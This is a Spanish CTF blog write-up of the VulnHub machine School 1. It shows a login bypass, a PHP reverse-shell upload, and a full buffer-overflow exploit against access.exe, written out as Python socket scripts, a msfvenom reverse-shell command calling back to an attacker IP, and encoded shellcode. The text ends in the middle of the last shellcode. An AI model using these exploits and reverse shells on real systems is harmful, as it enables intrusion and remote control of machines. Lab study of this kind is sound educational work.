---
layout: post
title: Máquina School 1 - VulnHub
date: 2024-03-11 15:25 -0600
categories: CTF
tags: Vulnhub Writeup Buffer-Overflow
image:
  path: /assets/img/headers/banner_school_1.jpg
  alt: Máquina School 1 de Vulnhub
---

Hola, en esta ocasión vamos a realizar la máquina school 1 de VulnHub. Antes de empezar, me gustaría agradecer a [foxlox](https://www.vulnhub.com/author/foxlox,701/) por los alimentos del día de hoy. 

Empezando por un escaneo de puertos y servicios tenemos los siguientes.

![Nombre Descriptivo](/assets/img/posts/20240310164335.png)

La página web presenta un login y hay un instinto que debe de forjar al ver un login, y es que debe de probar contraseñas por defecto o SQLi 🤨.

![Nombre Descriptivo](/assets/img/posts/20240310175451.png)

![Nombre Descriptivo](/assets/img/posts/20240310175514.png)

Y bueno, que sin vergüenza.

> Aun que esta es una de las maneras de entrar al panel, existe otra mediante un archivo sql alojado en la ruta `/student_attendance/database` el cual contiene las credenciales de los usuarios, pero bueno.

Explore un poco la web y no encontré algo interesante hasta que di `crtl+u` para ver el codigo fuente y vayaa.

![Nombre Descriptivo](/assets/img/posts/20240310175918.png)

Vamos?

![Nombre Descriptivo](/assets/img/posts/20240310180118.png)

Y buenooo, vamos a probar si funciona el formulario.

```shell
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

![Nombre Descriptivo](/assets/img/posts/20240310182049.png)
![Nombre Descriptivo](/assets/img/posts/20240310183326.png)

Y buenoo que te puedo decir, la misma página nos hace el favor de consultar el archivo subido, tusen takk 🤗. 

Ya estando dentro, busqué ciertas cosas para la escalada de privilegios. 

- Revisé los usuarios 
- Inspeccione las configuraciones de la web 
- Mire las tareas cron 
- Mire los permisos en las carpetas `/` 
 
 Encontré algunas cosas adicionales en algunos de los puntos anteriores, pero nada que me permitiera un movimiento lateral o algo nuevo que no hallamos encontrado. 
 
 Peroo podía entrar a `/home`, de cada uno de los usuarios y en uno de estos estaba la primera flag.

![Nombre Descriptivo](/assets/img/posts/20240310184004.png)

Después me topé que podía entrar a la carpeta `/root`. No podía hacer mucho ahí, pero pude ver esto:

![Nombre Descriptivo](/assets/img/posts/20240310184310.png)

De manera velozmente rápida me dirigí a `/opt/access.exe` en el cual no podía manipular el archivo, aunque me di cuenta de que me había topado con el señor buffer overflow, así que después de ver estos materiales:

- https://www.youtube.com/watch?v=sdZ8aE7yxMk&ab_channel=s4vitar
- https://www.youtube.com/watch?v=1trC2QgmcZw&t=1703s&ab_channel=Spartan-Cybersecurity

Lo hice, así que sea usted bienvenido, por si lo había olvidado.  
  
Para explotar un buffer overflow, vamos a requerir un laboratorio para el análisis de un binario en el cual vamos a realizar las pruebas y, una vez que esté listo, lanzarlo al objetivo.

- Windows 10 or windows 7
- [Immunity Debugger](https://www.immunityinc.com/products/debugger/) instalado con el plugin de [mona.py](https://github.com/corelan/mona)
- Café sin azúcar 🤨 

Primer paso, descargar esos archivos y métalos en su laboratorio de Windows.

Importante desactivar el DEP de Windows, reinicie. Y ahora sí, ejecute su Immunity debugger y habra el `access.exe`.

![Nombre Descriptivo](/assets/img/posts/20240305175529.png)

Por el momento no tiene que conocer qué hace cada una de las líneas. Recuerda que la máquina tenía el puerto 23 abierto curiosamente, el puerto 23 respondía, con esto, un programa:

![Nombre Descriptivo](/assets/img/posts/20240311141801.png)

Bueno`access.exe` es el responsable de este puerto y lo puede saber por qué al iniciar el programa con el debugger, ha abierto el puerto 23 con dicha respuesta, ok?

### Buffer Overflow

Para llevar a cabo un BOF generalmente requerimos de ciertos puntos, como:

1. Determinar los bytes que causan el desbordamiento
2. Sobreescribir el registro EIP
3. Identificar el offset
4. Tener el control del registro EIP
5. Identificar y eliminar los badcharts
6. Generar el shellcode
7. Buscar direccion con JWT ESP
8. Explotar

Dicho esto, vamos a requerir script, el cual nos permitirá entablar una conexión sock al servicio, e ir realizando los anteriores puntos.

#### Determinando los bytes que causan el desbordamiento 
Para esto utilizaremos un script en python 3, el cual enviará una cierta cantidad de bytes ("A"), y si la aplicación responde de forma normal, se duplicará la cantidad de bytes de forma que en algún momento se aplique el desbordamiento y nos muestre un aproximado de bytes enviados .

```python
#!/usr/bin/python3

import sys, socket, time, argparse
from pwn import *  

#arguments menu
parser = argparse.ArgumentParser(description='BOF arguments')
parser.add_argument('-rh', help='Host victim')
parser.add_argument('-rp', type=int,help='Port victim')
parser.add_argument('-b', type=int,default=100, help='Bytes jumps')
args = vars(parser.parse_args())

buffer = "A" * args['b']

p1 = log.progress("Data")

while True:
	try:
		p1.status("Sending {} bytes".format(len(buffer) - len (prefix)))
		
		#Create socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(1)
		
		#Connect to victim machine
		s.connect((args['rh'], args['rp']))
		
		#save response of 1024 bytes
		s.recv(1024)
		
		#send bytes
		s.send((buffer.encode()))
		
		#save response of 1024 bytes
		s.recv(1024)
	except:
		print("[*] Crash at {} bytes".format(len(buffer) - len (prefix)))
		sys.exit(0)
		
	#Not crash? send more bytes.
	buffer += args['b'] * "A"
	time.sleep(1)
```

 Recuerden iniciar el programa `access.exe` con el nuestro debugger (en estado "Running").

![Nombre Descriptivo](/assets/img/posts/20240305175529.png)

Después hacemos uso del script para enviar 350 bytes y ver si ha desbordado. Si no lo hizo, aumentaría otros 350 bytes y así sucesivamente.

```shell
python fuzzingBOF.py -rh 192.168.1.72 -rp 23 -b 350
```

Hasta que en algún momento se desborda, el propio debugger te lo indica, muy importante es que enviemos la cantidad suficiente para aplicar un desbordamiento que llegue hasta el registro EIP, lo podemos saber por qué al enviar muchos bytes representando múltiples "A", debemos ver el registro EIP representando estas mismas, pero en hexadecimal es decir *41414141*.

![Nombre Descriptivo](/assets/img/posts/20240305191726.png)

#### Sobreescribiendo el registro EIP 

Esto está perfecto, puesto que con 2100 bytes hemos desbordado la aplicación y hemos alcanzado a sobreescribir el *registro EIP*.

#### Determinar offset 

Ahora lo que requerimos es saber en qué momento del desbordamiento, estamos sobreescribiendo el registro EIP. Es decir, identificar los bytes en el momento en el que se desborda el servicio, hasta el registro EIP. A esto se le conoce como offset.

Una vez que determinemos el offset podemos insertar bytes randoms que nos sirvan de relleno para después llegar al registro EIP y tomar el control de este 😼. 

Para esto vamos a usar un par de utilidades de metasploit.

-  msf-pattern_create
- msf-pattern_offset 

Con la utilidad `msf-pattern_create` vamos a crear una cantidad de bytes aleatorios para desbordar el servicio, que en nuestro lo hizo con 2100 bytes, asi que lo generamos y lo copiamos:

```shell
msf-pattern_create -l 2100 -s ABC,abc,123
```

Dicho esto, modificaremos el script anterior quitando ciertas cosas que ya no requerimos y quedando de la siguiente forma:

```python
#!/usr/bin/python3

import sys, socket, time, argparse
from pwn import *  

#arguments menu
parser = argparse.ArgumentParser(description='BOF arguments')
parser.add_argument('-rh', help='Host victim')
parser.add_argument('-rp', type=int,help='Port victim')
args = vars(parser.parse_args())

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9" #random bytes to crash the service

try:
	print("[*] Sending bytes")
	
	#Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(1)
	
	#Connect to victim machine
	s.connect((args['rh'], args['rp']))
	
	#save response of 1024 bytes
	s.recv(1024)
	
	#send bytes
	s.send((buffer.encode()))
except:
	print("[*] Crash")
	sys.exit(0)
	
```

Al ejecutar el script con esto, está claro que se aplica un desbordamiento al servicio, y está bien, pero lo que nos interesa ahora es el valor del registro EIP para hacer uso de la otra utilidad de metasploit `msf-pattern_offset` y sacar el offset.

![Nombre Descriptivo](/assets/img/posts/20240306092104.png)

> Recuerden que cuando insertamos múltiples "AAAA" el valor de EIP representaba 41414141, ahora no debe de valer eso, sino un valor diferente respecto a los caracteres que insertamos aleatoriamente.

El valor del registro EIP fue `42326242`. Este registro lo pasaremos a la otra utilidad, junto con los bytes enviados.

```shell
msf-pattern_offset -l 2100 -q 42326242 -s ABC,abc,123 
```

![Nombre Descriptivo](/assets/img/posts/20240306100007.png)

Lo que nos resulta es una serie de offsets que tenemos que ir probando uno a uno, para determinar exactamente el offset, empiece del mayor al menor.

#### Controlando el registro EIP 

En este caso, llegué hasta el offset *1902* que fue el correcto. ¿Cómo lo supe? Pues bueno, al enviar 1902 aleatorios + "BBBB" el registro EIP por consecuencia debe de valer *42424242*.

```python
#!/usr/bin/python3

import sys, socket, time, argparse
from pwn import *  

#arguments menu
parser = argparse.ArgumentParser(description='BOF arguments')
parser.add_argument('-rh', help='Host victim')
parser.add_argument('-rp', type=int,help='Port victim')
args = vars(parser.parse_args())

buffer = "A" * 1902 + "B" * 4 #offset + overwrite EIP with 42424242

try:
	print("[*] Sending bytes")
	
	#Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(1)
	
	#Connect to victim machine
	s.connect((args['rh'], args['rp']))
	
	#save response of 1024 bytes
	s.recv(1024)
	
	#send bytes
	s.send((buffer.encode()))
except:
	print("[*] Crash")
	sys.exit(0)
	
```

![Nombre Descriptivo](/assets/img/posts/20240308233616.png)

#### Identificando y eliminando los badcharts

Para hacer este punto, vamos a requerir crear un directorio de trabajo con immunity debugger, que creamos con el comando:

```debugger
!mona config -set workingfolder C:\Users\xor\Desktop\debugger\school-access-vulnhub\%p 
```

Ahora requerimos una lista de bytes los cuales representen un valor ascii. Lo podemos generar con mona y estos se guardarán en nuestro directorio de trabajo.

```debugger
!mona bytearray
```

![Nombre Descriptivo](/assets/img/posts/20240306115447.png)

![Nombre Descriptivo](/assets/img/posts/20240306115848.png)

Una vez que tenemos la lista de bytes (bytearray.txt), el array lo enviaremos por medio del script.

```python
#!/usr/bin/python3

import sys, socket, time, argparse
from pwn import *  

#arguments menu
parser = argparse.ArgumentParser(description='BOF arguments')
parser.add_argument('-rh', help='Host victim')
parser.add_argument('-rp', type=int,help='Port victim')
args = vars(parser.parse_args())

bytesarray=("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A" * 1902 + "B" * 4 + bytesarray

try:
	print("[*] Sending bytes")
	
	#Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(1)
	
	#Connect to victim machine
	s.connect((args['rh'], args['rp']))
	
	#save response of 1024 bytes
	s.recv(1024)
	
	#send bytes
	s.send((buffer.encode()))
except:
	print("[*] Crash")
	sys.exit(0)
	
```

Al ejecutar el script, provocaremos un desbordamiento, pero la intención es que nuestros bytesarray se coloquen en la pila ESP de forma consecutiva y bonita. 

Una vez que ejecutemos el script, vamos al debugger e identificamos el registro ESP y le damos click derecho "Follow in dump". Ahi es donde se imprimen nuestros bytesarray:

![Nombre Descriptivo](/assets/img/posts/20240306174516.png)

Como puedes observar no hay un orden, esto se debe a los badcharts, es por eso que debemos eliminarlo. 

Empezando por el byte `\x00`, ya que este representa un nullbyte, el cual siempre es un badchart así que no dudes en quitarlo de una. 

Cada vez que identifiquemos un badchart hay que eliminarlo de los bytesarray en el script y del archivo *bytearray.bin* (mas adelante):

```python
bytesarray=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

Y volvemos a ejecutar el script, y aquí se hace presente nuevamente `!mona`. Cuando se desborde la aplicación vamos a tomar la dirección del ESP, y el archivo bytearray.bin

```debugger
!mona compare -f C:\Users\xor\Desktop\debugger\school-access-vulnhub\access\bytearray.bin -a <address_ESP>

```

`!mona` Nos indicará cuál es el siguiente badchart.

![Nombre Descriptivo](/assets/img/posts/20240306201141.png)

Como pueden ver en la imagen, me adelante un poco y ya identifique otros badcharts `\x00\x4d\x4f`.

Una vez identificado, se los pasamos a mona para que lo remueva del archivo `bytearray.bin`.

```debugger
!mona bytearray -cpb "\x00\x4d\x4f"
```

Y hacemos este proceso hasta que `!mona` nos indique que ya no hay más badcharts o hasta que se nos presente falsos positivos 🤨. 

Así que vuelve a repetir los siguientes puntos:

- Modifica los bytearray del script y ejecuta.
- Ejecuta `!mona compare` en busca de otro badchart.
- Ejecuta `!mona -cpb` para sobreescribir `bytearray.bin`


**Falso positivo.**

Como te decía, en ocasiones `!mona compare` puede resultar falsos positivos, como por ejemplo:
![Nombre Descriptivo](/assets/img/posts/20240307135913.png)

Podrá observar que continúe buscando badcharts hasta que llegó un punto que me resultó una secuencia de `80,81,82`. Muy probablemente, cuando se encuentre una secuencia, puede que esté frente a un falso positivo. 

Por este motivo he eliminado este secuencia y he continuado.

#### Creando shellcode

Una vez determinados nuestros bytesarray, vamos a crear un shellcode para entablarnos una shell reversa, excluyendo los badcharts identificados.

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.66 LPORT=443 -f c -b "\x00\x4d\x4f\x5f\x79\x7e\x7f" EXITFUNC=thread
```
![Nombre Descriptivo](/assets/img/posts/20240310203625.png)
Algo que debemos de tomar en cuenta al crear el shellcode, es que mestasploit usa un encoder, adiós.

Vamos a insertar este shellcode al script y agregar un [NOPs](https://www.google.com/search?q=que+son+los+nops+en+buffer+overflow&client=firefox-b-d&sca_esv=8031294fadf62b25&ei=827uZe3-L4zukPIPidCg4AQ&oq=que+son+los+NOPs+en+buffer+overflo&gs_lp=Egxnd3Mtd2l6LXNlcnAiInF1ZSBzb24gbG9zIE5PUHMgZW4gYnVmZmVyIG92ZXJmbG8qAggAMgcQIRgKGKABMgcQIRgKGKABSP04UM8EWPkscAN4AZABApgBigqgAYU0qgEPMC40LjQuMS4xLjIuMS4yuAEDyAEA-AEBmAIQoAKEKcICChAAGEcY1gQYsAOYAwCIBgGQBgiSBw8zLjQuNC4wLjIuMi4wLjGgB7Q1&sclient=gws-wiz-serp), con la intención de darle un tiempo al sistema que se encargue de decodificar el shellcode que generamos con metasploit.

```python
#!/usr/bin/python2

import sys, socket, time, argparse
from pwn import *  

#arguments menu
parser = argparse.ArgumentParser(description='BOF arguments')
parser.add_argument('-rh', help='Host victim')
parser.add_argument('-rp', type=int,help='Port victim')
args = vars(parser.parse_args())

shellcode=("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xd3\xcb\xec\xba\x83\xee\xfc\xe2\xf4\x2f\x23\x6e\xba"
"\xd3\xcb\x8c\x33\x36\xfa\x2c\xde\x58\x9b\xdc\x31\x81\xc7"
"\x67\xe8\xc7\x40\x9e\x92\xdc\x7c\xa6\x9c\xe2\x34\x40\x86"
"\xb2\xb7\xee\x96\xf3\x0a\x23\xb7\xd2\x0c\x0e\x48\x81\x9c"
"\x67\xe8\xc3\x40\xa6\x86\x58\x87\xfd\xc2\x30\x83\xed\x6b"
"\x82\x40\xb5\x9a\xd2\x18\x67\xf3\xcb\x28\xd6\xf3\x58\xff"
"\x67\xbb\x05\xfa\x13\x16\x12\x04\xe1\xbb\x14\xf3\x0c\xcf"
"\x25\xc8\x91\x42\xe8\xb6\xc8\xcf\x37\x93\x67\xe2\xf7\xca"
"\x3f\xdc\x58\xc7\xa7\x31\x8b\xd7\xed\x69\x58\xcf\x67\xbb"
"\x03\x42\xa8\x9e\xf7\x90\xb7\xdb\x8a\x91\xbd\x45\x33\x94"
"\xb3\xe0\x58\xd9\x07\x37\x8e\xa3\xdf\x88\xd3\xcb\x84\xcd"
"\xa0\xf9\xb3\xee\xbb\x87\x9b\x9c\xd4\x34\x39\x02\x43\xca"
"\xec\xba\xfa\x0f\xb8\xea\xbb\xe2\x6c\xd1\xd3\x34\x39\xea"
"\x83\x9b\xbc\xfa\x83\x8b\xbc\xd2\x39\xc4\x33\x5a\x2c\x1e"
"\x7b\xd0\xd6\xa3\x2c\x12\xd2\x8c\x84\xb8\xd3\xca\x57\x33"
"\x35\xa1\xfc\xec\x84\xa3\x75\x1f\xa7\xaa\x13\x6f\x56\x0b"
"\x98\xb6\x2c\x85\xe4\xcf\x3f\xa3\x1c\x0f\x71\x9d\x13\x6f"
"\xbb\xa8\x81\xde\xd3\x42\x0f\xed\x84\x9c\xdd\x4c\xb9\xd9"
"\xb5\xec\x31\x36\x8a\x7d\x97\xef\xd0\xbb\xd2\x46\xa8\x9e"
"\xc3\x0d\xec\xfe\x87\x9b\xba\xec\x85\x8d\xba\xf4\x85\x9d"
"\xbf\xec\xbb\xb2\x20\x85\x55\x34\x39\x33\x33\x85\xba\xfc"
"\x2c\xfb\x84\xb2\x54\xd6\x8c\x45\x06\x70\x0c\xa7\xf9\xc1"
"\x84\x1c\x46\x76\x71\x45\x06\xf7\xea\xc6\xd9\x4b\x17\x5a"
"\xa6\xce\x57\xfd\xc0\xb9\x83\xd0\xd3\x98\x13\x6f")

Nops="\x90" * 30 
buffer = "A" * 1902 + "B" * 4 + Nops + shellcode

try:
	print("[*] Sending bytes")
	
	#Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(1)
	
	#Connect to victim machine
	s.connect((args['rh'], args['rp']))
	
	#save response of 1024 bytes
	s.recv(1024)
	
	#send bytes
	s.send(buffer)
except:
	print("[*] Crash")
	sys.exit(0)
	
```

#### Buscando el OpCode JWP ESP 

Si bien la idea de tomar el control del registro EIP para apuntar a la pila ESP y ejecutar el shellcode que hemos insertado ahí mismo en la pila, es algo que suena bastante bien. Saltar del registro EIP al ESP solo indicando el valor EIP con la dirección ESP, no funcionará. 

Por esto mismo entra el JMP ESP, lo que significa que buscaremos un código de operación de tipo JMP ESP. Este tipo de operación realiza un salto al ESP 👀. 

Dicho esto, el Opcode lo debemos de buscar en ciertos módulos que use el binario access.exe Podemos utilizar `!mona` para listar los modulos:

```debugger
!mona modules
```

Cabe aclarar que normalmente al enfrentarte a un CTF el binario vulnerable al BOF incluye un dll y en ocasiones no cuentan con alguna protección para evitar la ejecución de código; por lo tanto, por ahora no debe de burlar este tipo de protecciones.

![Nombre Descriptivo](/assets/img/posts/20240311001028.png)

Una vez identificado el módulo, vamos a buscar dentro de este un código de operación (OpCode) de tipo JMP ESP, con `!mona`. 

Pero antes con `msf-nasm_shell` vamos a saber una especie de ID para buscar el OpCode JMP ESP.

![Nombre Descriptivo](/assets/img/posts/20240307143051.png)

```debugger
#FFE4  = \xff\xe4
!mona find -s "\xff\xe4" -m funcs_access.dll 
```

Y buscamos:

![Nombre Descriptivo](/assets/img/posts/20240307144350.png)

Obtenemos direcciones que utilizan este tipo de salto, lo único, que debe de considerar entre elegir una u otra, es que en la dirección no contenga algún badchart que hayamos identificado anteriormente; `\x00\x4d\x4f\x5f\x79\x7e\x7f`. 

Si buscamos esta dirección en el debugger con el programa corriendo, podemos ver el OpCode y confirmar que es un JMP ESP.

![Nombre Descriptivo](/assets/img/posts/20240311094319.png)

Una vez identificado la dirección de este `625012D0`, vamos a editar el script para que EIP apunte a esta dirección y se aplique el salto a nuestro shellcode. 

Solo que hay que hacer una pequeña maniobra. Ya que hay que colocar en el EIP la dirección `625012D0` en un formato diferente.

```
direccion = 625012D0
direccion_hex = \x62\x50\x12\xD0
invertida = \xD0\x12\x50\x62 #Asi debe de quedar
```

Ahora sí, modificamos el script y ejecutamos python2:

```python
#!/usr/bin/python2

import sys, socket, time, argparse
from pwn import *  

#arguments menu
parser = argparse.ArgumentParser(description='BOF arguments')
parser.add_argument('-rh', help='Host victim')
parser.add_argument('-rp', type=int,help='Port victim')
parser.add_argument('-b', type=int,default=100, help='Bytes jumps')
args = vars(parser.parse_args())

shellcode=("\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x03\x95\x64\x6c\x83\xee\xfc\xe2\xf4\xff\x7d\xe6\x6c"
"\x03\x95\x04\xe5\xe6\xa4\xa4\x08\x88\xc5\x54\xe7\x51\x99"
"\xef\x3e\x17\x1e\x16\x44\x0c\x22\x2e\x4a\x32\x6a\xc8\x50"
"\x62\xe9\x66\x40\x23\x54\xab\x61\x02\x52\x86\x9e\x51\xc2"
"\xef\x3e\x13\x1e\x2e\x50\x88\xd9\x75\x14\xe0\xdd\x65\xbd"
"\x52\x1e\x3d\x4c\x02\x46\xef\x25\x1b\x76\x5e\x25\x88\xa1"
"\xef\x6d\xd5\xa4\x9b\xc0\xc2\x5a\x69\x6d\xc4\xad\x84\x19"
"\xf5\x96\x19\x94\x38\xe8\x40\x19\xe7\xcd\xef\x34\x27\x94"
"\xb7\x0a\x88\x99\x2f\xe7\x5b\x89\x65\xbf\x88\x91\xef\x6d"
"\xd3\x1c\x20\x48\x27\xce\x3f\x0d\x5a\xcf\x35\x93\xe3\xca"
"\x3b\x36\x88\x87\x8f\xe1\x5e\xfd\x57\x5e\x03\x95\x0c\x1b"
"\x70\xa7\x3b\x38\x6b\xd9\x13\x4a\x04\x6a\xb1\xd4\x93\x94"
"\x64\x6c\x2a\x51\x30\x3c\x6b\xbc\xe4\x07\x03\x6a\xb1\x3c"
"\x53\xc5\x34\x2c\x53\xd5\x34\x04\xe9\x9a\xbb\x8c\xfc\x40"
"\xf3\x06\x06\xfd\xa4\xc4\x02\xd2\x0c\x6e\x03\x94\xdf\xe5"
"\xe5\xff\x74\x3a\x54\xfd\xfd\xc9\x77\xf4\x9b\xb9\x86\x55"
